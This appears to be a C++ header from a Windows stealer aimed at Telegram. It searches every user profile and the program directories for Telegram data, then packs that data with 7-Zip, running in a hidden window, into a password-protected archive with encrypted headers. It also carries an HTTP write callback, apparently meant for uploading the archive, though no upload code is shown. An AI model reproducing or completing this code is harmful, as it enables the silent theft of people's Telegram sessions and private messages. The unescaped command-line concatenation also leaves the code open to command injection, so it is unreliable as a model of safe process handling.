#pragma once
#include <string>
#include <vector>
#include <filesystem>
#include <random>

namespace fs = std::filesystem;

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append((char*)contents, total_size);
    return total_size;
}

namespace Utils {
    std::string random_string(size_t length) {
        const std::string chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(0, static_cast<int>(chars.size()) - 1);

        std::string result;
        result.reserve(length);
        for (size_t i = 0; i < length; ++i) {
            result += chars[dist(gen)];
        }
        return result;
    }

    std::string find_telegram_path() {
        const std::vector<std::string> search_paths = {
            std::string(getenv("APPDATA")) + "\\"/*path*/,
            std::string(getenv("LOCALAPPDATA")) + "\\"/*path*/,
            "C:\\Program Files\\"/*path*/,
            "C:\\Program Files (x86)\\"/*path*/
        };

        for (const auto& path : search_paths) {
            if (fs::exists(path)) {
                return path;
            }
        }

        std::string users_dir = "C:\\Users";
        for (const auto& entry : fs::directory_iterator(users_dir)) {
            if (entry.is_directory()) {
                std::string user_path = entry.path().string();
                for (const auto& appdata : { "\\AppData\\Roaming\\"/*path*/, "\\AppData\\Local\\"/*path*/ }) {
                    std::string telegram_path = user_path + appdata;
                    if (fs::exists(telegram_path)) {
                        return telegram_path;
                    }
                }
            }
        }

        return "";
    }

    bool create_7z_archive(const std::string& source_dir,
        const std::string& output_path,
        const std::string& password) {

        if (!fs::exists(source_dir)) {
            return false;
        }

        if (!fs::exists(Settings::SEVEN_ZIP_PATH)) {
            return false;
        }

        fs::path output_dir = fs::path(output_path).parent_path();
        if (!output_dir.empty() && !fs::exists(output_dir)) {
            if (!fs::create_directories(output_dir)) {
                return false;
            }
        }

        std::string command = "\"" + Settings::SEVEN_ZIP_PATH + "\" a -t7z \"" +
            output_path + "\" \"" + source_dir + "\\*\" -p\"" +
            password + "\" -mhe=on -y";

        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;  // Hide the window

        if (!CreateProcessA(
            NULL,                   // lpApplicationName
            const_cast<LPSTR>(command.c_str()), // lpCommandLine
            NULL,                   // lpProcessAttributes
            NULL,                   // lpThreadAttributes
            FALSE,                  // bInheritHandles
            CREATE_NO_WINDOW,       // dwCreationFlags
            NULL,                   // lpEnvironment
            NULL,                   // lpCurrentDirectory
            &si,                    // lpStartupInfo
            &pi                     // lpProcessInformation
        )) {
            DWORD error = GetLastError();
            std::cerr << "CreateProcess failed (" << error << "): ";
            switch (error) {
            case 2: std::cerr << "File not found (check 7z path)"; break;
            case 5: std::cerr << "Access denied"; break;
            default: std::cerr << "Unknown error"; break;
            }
            std::cerr << std::endl;
            return false;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        DWORD exit_code;
        GetExitCodeProcess(pi.hProcess, &exit_code);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (!fs::exists(output_path)) {
            return false;
        }

        return exit_code == 0;
    }
}